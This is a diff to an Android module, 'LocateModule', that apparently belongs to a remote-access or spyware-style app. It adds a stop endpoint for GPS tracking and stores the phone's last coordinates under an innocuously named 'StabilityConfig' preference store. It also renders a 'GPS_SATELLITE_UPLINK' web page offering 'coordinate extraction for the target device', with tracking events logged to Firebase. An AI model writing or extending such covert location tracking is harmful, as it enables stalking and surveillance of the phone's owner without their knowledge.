@@ -3,6 +3,7 @@ package com.labs.labrats.modules;
 import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
@@ -40,41 +41,74 @@ public class LocateModule extends BaseModule {
             return serveGpsPage(session);
         } else if (uri.equals("/gps/locate")) {
             return serveGpsLocate(params);
+        } else if (uri.equals("/gps/stop")) {
+            return stopGpsTracking();
         } else if (uri.equals("/gps/repair")) {
             return serveGpsPermissionRequest();
         }
         return null;
     }
 
+    private static volatile java.util.concurrent.CountDownLatch activeGpsLatch = null;
+    private static volatile android.location.LocationListener activeGpsListener = null;
+
+    private Response stopGpsTracking() {
+        Log.d("LocateModule", "Disengaging GPS location tracking");
+        FirebaseConfig.logActivity("LOCATE_STOP: Precision GPS tracking disengaged");
+        try {
+            if (activeGpsLatch != null) {
+                activeGpsLatch.countDown();
+                activeGpsLatch = null;
+            }
+            if (activeGpsListener != null) {
+                LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+                if (lm != null) lm.removeUpdates(activeGpsListener);
+                activeGpsListener = null;
+            }
+        } catch (Exception ignored) {}
+        return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\":\"GPS_DISENGAGED\"}");
+    }
+
     private Response serveGpsPage(IHTTPSession session) {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128205; GPS_SATELLITE_UPLINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'GPS_SATELLITE_UPLINK', 'Active tracking and coordinate extraction for the target device.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
         
-        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
+        html.append("<div id=\"map-container\" style=\"width: 100%; height: 480px; background: #060b10; border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 12px; margin-bottom: 25px; overflow: hidden; position: relative; box-shadow: 0 0 15px rgba(0, 242, 255, 0.15);\">");
         html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
         html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
         html.append("</div>");
-        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; display: none;\" allowfullscreen></iframe>");
+        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" referrerpolicy=\"no-referrer\" style=\"border:0; display: none;\" allowfullscreen></iframe>");
         html.append("</div>");
 
         html.append("<div class=\"btn-container\" style=\"margin-bottom: 30px; display: flex; justify-content: center; gap: 10px;\">");
-        html.append("<button onclick=\"locateDevice()\" class=\"btn\" style=\"margin: 0;\">&#128205; PING_LOCATION</button>");
-        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); display: none; margin: 0;\">&#128640; OPEN_MAPS</button>");
+        html.append("<button id=\"ping-btn\" onclick=\"toggleLocationPing()\" class=\"btn\" style=\"margin: 0; border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); border-radius: 12px !important; width: 210px !important; min-width: 210px !important; height: 45px !important; padding: 0 16px !important;\">&#128205; PING_LOCATION</button>");
         html.append("</div>");
         
-        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
+        SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
+        String lastLat = prefs.getString("last_lat", "");
+        String lastLon = prefs.getString("last_lon", "");
+        long lastTime = prefs.getLong("last_time", 0);
+
+        boolean hasLastLoc = !lastLat.isEmpty() && !lastLon.isEmpty();
+        String initialCoordText = "WAITING_FOR_DATA...";
+        if (hasLastLoc) {
+            String timeAgo = FirebaseConfig.formatDuration((int) ((System.currentTimeMillis() - lastTime) / 1000)) + " ago";
+            initialCoordText = "<span style=\"color: var(--neon-yellow); font-weight: bold;\">&#9888;&#65039; LAST_KNOWN: LAT: " + lastLat + " | LON: " + lastLon + " (" + timeAgo + ")</span>";
+        }
+
+        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px; display: flex; flex-direction: row; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 15px; width: 100%;\">");
+        html.append("<div style=\"flex: 1; min-width: 200px;\">");
         html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">COORD_SYSTEM</div>");
-        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
+        html.append("<div id=\"coord-display\" class=\"info-value\" style=\"font-size: 0.88rem; line-height: 1.4;\">").append(initialCoordText).append("</div>");
+        html.append("</div>");
+        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" data-lat=\"").append(lastLat).append("\" data-lon=\"").append(lastLon).append("\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius: 12px !important; width: 210px !important; min-width: 210px !important; height: 45px !important; padding: 0 16px !important; margin: 0; white-space: nowrap; flex-shrink: 0; ").append(hasLastLoc ? "display: inline-block;" : "display: none;").append("\">&#128640; OPEN_COORDS</button>");
         html.append("</div>");
 
-        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 8px;\">");
         html.append("<div class=\"info-label\" style=\"font-size: 1.35rem; opacity: 0.7;\">LOCATION_STREAM</div>");
-        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
+        html.append("<div id=\"gps-log\" style=\"height: 180px; max-height: 180px; overflow-y: auto; color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5; padding-right: 5px; box-sizing: border-box;\">");
         html.append("<div>[SYSTEM] Tracker standby...</div>");
         html.append("</div></div>");
 
@@ -234,6 +268,15 @@ public class LocateModule extends BaseModule {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
                 Log.d("LocateModule", "Success (Provider: " + location.getProvider() + "): " + lat + ", " + lon);
+                
+                try {
+                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                        .edit()
+                        .putString("last_lat", String.format(Locale.US, "%.6f", lat))
+                        .putString("last_lon", String.format(Locale.US, "%.6f", lon))
+                        .putLong("last_time", System.currentTimeMillis())
+                        .apply();
+                } catch (Exception ignored) {}
                 
                 LabRatsWorker.execute(() -> {
                     try {
